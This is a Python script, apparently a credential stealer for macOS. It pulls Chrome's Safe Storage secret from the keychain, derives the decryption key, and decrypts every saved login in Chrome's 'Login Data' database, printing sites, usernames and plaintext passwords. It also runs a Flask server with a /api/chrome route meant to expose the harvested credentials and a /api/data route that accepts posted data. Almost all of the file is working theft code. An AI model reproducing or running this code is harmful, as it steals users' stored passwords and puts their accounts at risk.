import os
import json
import base64
import sqlite3
import shutil
import subprocess
from Crypto.Cipher import AES
import hashlib
from flask import Flask, jsonify, request

app = Flask(__name__)

def get_master_key():
    cmd = [
        "security", "find-generic-password",
        "-w",
        "-a", "Chrome",
        "-s", "Chrome Safe Storage"
    ]
    result = subprocess.run(cmd, capture_output=True, text=True)
    password = result.stdout.strip()
    master_key = hashlib.pbkdf2_hmac(
        "sha1",
        password.encode("utf-8"),
        b"saltysalt",
        1003,
        dklen=16
    )
    return master_key

def decrypt_password(ciphertext, master_key):
    try:
        if ciphertext[:3] == b"v10":
            iv = b" " * 16
            payload = ciphertext[3:]
            cipher = AES.new(master_key, AES.MODE_CBC, iv)
            decrypted = cipher.decrypt(payload)
            padding = decrypted[-1]
            return decrypted[:-padding].decode("utf-8")
    except:
        return ""
    return ""

def get_chrome_passwords():
    db_path = os.path.expanduser(
        "~/Library/Application Support/Google/Chrome/Default/Login Data"
    )
    if not os.path.exists(db_path):
        print("Chrome non trouve")
        return
    tmp_path = "/tmp/login_data_tmp.db"
    shutil.copyfile(db_path, tmp_path)
    master_key = get_master_key()
    conn = sqlite3.connect(tmp_path)
    cursor = conn.cursor()
    cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
    results = cursor.fetchall()
    conn.close()
    os.remove(tmp_path)
    if not results:
        print("Aucun mot de passe trouve.")
        return
    print(f"{'Site':<45} {'Utilisateur':<30} {'Mot de passe'}")
    print("-" * 95)
    for url, username, encrypted_password in results:
        password = decrypt_password(encrypted_password, master_key)
        if username and password:
            print(f"{url:<45} {username:<30} {password}")


@app.route('/api/data', methods=['POST'])
def receive_data():
    data = request.get_json()
    return jsonify({
        "status": "ok",
        "received": data
    }), 200


@app.route('/api/chrome', methods=['GET'])
def chrome_data():
    return jsonify(get_chrome_passwords())


if __name__ == '__main__':
    app.run(debug=True, port=5000)